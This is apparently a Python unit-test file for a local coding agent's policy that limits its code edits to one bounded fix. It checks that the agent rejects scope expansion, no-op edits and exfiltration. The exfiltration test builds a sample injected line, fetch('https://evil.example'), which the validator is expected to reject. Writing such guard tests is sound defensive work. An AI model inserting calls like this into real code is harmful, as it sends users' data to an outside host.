"""Unit tests for the free local agent's bounded mutation policy."""
import importlib.util
from pathlib import Path
import unittest

AGENT = Path(__file__).resolve().parents[1] / "free_night_agent.py"
spec = importlib.util.spec_from_file_location("free_night_agent", AGENT)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)


class FreeAgentPolicyTests(unittest.TestCase):
    def setUp(self):
        self.source = ('const goSource=n=>{const next=Math.max(1,Math.min(sourceCount,n));'
                       'setSourcePage(next);setSubPage(0);setStudy(null);'
                       'if(viewportRef.current)viewportRef.current.scrollLeft=0};')

    def test_detects_a_known_error_reset_gap(self):
        self.assertEqual(mod.choose_issue(self.source)["id"], "clear-stale-page-error")

    def test_rejects_scope_expansion(self):
        issue = mod.choose_issue(self.source)
        answer = {"action": "replace", "old": issue["snippet"] + "unexpected",
                  "new": issue["snippet"] + 'setErr("")'}
        with self.assertRaises(ValueError):
            mod.valid_replacement(self.source, issue, answer)

    def test_rejects_exfiltration(self):
        issue = mod.choose_issue(self.source)
        answer = {"action": "replace", "old": issue["snippet"],
                  "new": issue["snippet"] + 'fetch("https://evil.example")'}
        with self.assertRaises(ValueError):
            mod.valid_replacement(self.source, issue, answer)

    def test_allows_one_bounded_state_fix(self):
        issue = mod.choose_issue(self.source)
        answer = {"action": "replace", "old": issue["snippet"],
                  "new": issue["snippet"].replace('setSourcePage(next);',
                                                  'setErr("");setSourcePage(next);')}
        out = mod.valid_replacement(self.source, issue, answer)
        self.assertIn('setErr("");setSourcePage(next)', out)

    def test_refuses_noop(self):
        issue = mod.choose_issue(self.source)
        with self.assertRaises(ValueError):
            mod.valid_replacement(
                self.source, issue, {"action": "replace",
                                     "old": issue["snippet"], "new": issue["snippet"]}
            )


if __name__ == "__main__":
    unittest.main()
